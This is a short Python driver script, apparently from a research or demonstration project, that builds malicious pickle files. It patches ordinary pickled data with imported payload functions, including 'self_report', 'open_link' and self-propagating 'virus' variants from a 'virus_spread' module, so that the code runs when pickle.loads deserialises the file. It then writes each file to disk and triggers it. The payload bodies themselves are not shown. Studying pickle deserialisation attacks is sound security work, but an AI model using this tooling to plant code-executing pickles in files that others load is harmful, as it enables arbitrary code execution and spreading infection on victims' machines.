import pickle
import pickletools

from utils.bomb_functions import hi_bomb, raise_bomb, self_report_bomb, pic_bomb, open_link, if_bomb, normal_if_bomb, \
    if_bomb_2, example_not_more_256, if_bomb_2_normal
from utils.main_functions import patch_pickle_bytes
from utils.virus_spread import patch_bomb, disarm_fake_dumps


# Inspired by https://intoli.com/blog/dangerous-pickles/

def create_bomb(name, bomb_function, optimize=True):
    data = ["a", "list", "of", "values1"]

    payload = pickle.dumps(data)
    payload = patch_pickle_bytes(payload, bomb_function, optimize=optimize, encode=True)

    with open(f"bombs_pickles/bomb_{name}.pkl", "wb") as f:
        f.write(payload)

    print('=' * 40, f'\nThis is {name} bomb\n', '=' * 39)
    pickletools.dis(payload)
    print('=' * 20)
    try:
        pickle.loads(payload)
    except Exception as e:
        print(f'Got exception {type(e).__name__}: {e}')
    print('=' * 40)


def main():
    create_bomb('hi', hi_bomb)
    create_bomb('raise', raise_bomb)
    create_bomb('self_report', self_report_bomb)
    create_bomb('pic', pic_bomb)
    with disarm_fake_dumps():
        create_bomb('virus_with_hi', patch_bomb(patch_bomb, hi_bomb))
    with disarm_fake_dumps():
        create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
    create_bomb('open_link', open_link)

    create_bomb('if_bomb', if_bomb)
    create_bomb('normal_if_bomb', normal_if_bomb)
    create_bomb('if_bomb_2', if_bomb_2)
    create_bomb('delete_me', example_not_more_256)
    create_bomb('if_bomb_2_normal', if_bomb_2_normal)


if __name__ == "__main__":
    main()
